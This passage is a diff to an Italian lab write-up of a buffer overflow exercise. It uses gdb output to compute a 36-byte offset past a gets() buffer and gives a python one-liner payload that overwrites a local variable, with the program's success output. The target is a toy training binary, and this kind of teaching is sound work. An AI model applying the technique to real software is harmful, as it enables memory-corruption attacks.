@@ -68,5 +68,55 @@ Dump of assembler code for function main:
 
 1. `topolino` è memorizzato a `-0xc(%ebp)` (4 byte)
 2. `pluto` a `-0xe(%ebp)` (2 byte)
-3. Il buffer è a `-0x30(%ebp)`, passato poi a `gets()`
+3. Il buffer è a `-0x30(%ebp)`, passato poi a `gets()` in `%eax`
+4. Il valore di confronto è `0x41414141` (`AAAA` in ASCII)
+
+Per trovare l'**offset**, consideriamo che il buffer inizia a `-0x30(%ebp)` e vogliamo sovrascrivere `topolino` a `-0xc(%ebp)`.
+
+### Breakpoint e Registri
+
+Impostiamo un breakpoint a **main+37** (poco prima della chiamata `gets(buf)`) per leggere i registri:
+
+```
+(gdb) b *main+37
+Breakpoint 1 at 0x8048490: file esercizio2_1.c, line 12.
+(gdb) run
+Starting program: /home/tux/Desktop/buffer_overflow/bin/esercizio2_1
+
+Breakpoint 1, 0x08048490 in main (argc=1, argv=0xffffd674) at esercizio2_1.c:12
+12              gets(buf);
+(gdb) i r
+eax            0xffffd598
+ebp            0xffffd5c8
+...
+```
+
+`%eax` = `0xffffd598`  
+`%ebp` = `0xffffd5c8`
+
+Quindi l'offset (in byte) dal buffer a `topolino` è:
+
+```
+offset = eax - (ebp - 0xc)
+        = 0xffffd598 - 0xffffd5c8 + 0xc
+        = -36
+```
+
+In decimale, corrisponde a **36** byte prima di poter sovrascrivere `topolino`.
+
+### Creazione del Payload
+
+Per impostare `topolino = 0x41414141`, costruiamo un payload di 36 byte + `AAAA`:
+
+```bash
+python3 -c 'print("c"*36 + "AAAA")' | ./esercizio2_1
+```
+
+Output:
+
+```
+Ottimo! Hai modificato correttamente la variabile
+```
+
+Così abbiamo sovrascritto `topolino` con il valore desiderato `0x41414141`. L’analisi segue lo stesso principio dell’esercizio 2, ma qui la variabile `topolino` e le dimensioni del buffer differiscono.
 
